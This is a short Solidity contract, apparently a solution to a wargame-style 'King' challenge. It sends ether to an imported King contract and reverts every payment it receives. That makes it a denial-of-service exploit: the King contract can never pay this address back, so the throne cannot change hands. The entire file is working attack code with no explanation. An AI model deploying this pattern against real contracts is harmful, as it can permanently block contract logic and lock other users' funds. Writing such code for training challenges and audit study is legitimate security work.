// SPDX-License-Identifier: MIT

import "./King.sol";

pragma solidity ^0.8.10;

contract KingHack {
    function boom(address payable king) external payable {
        king.call{value: msg.value}("");
    }

    receive() external payable {
        revert();
    }
}
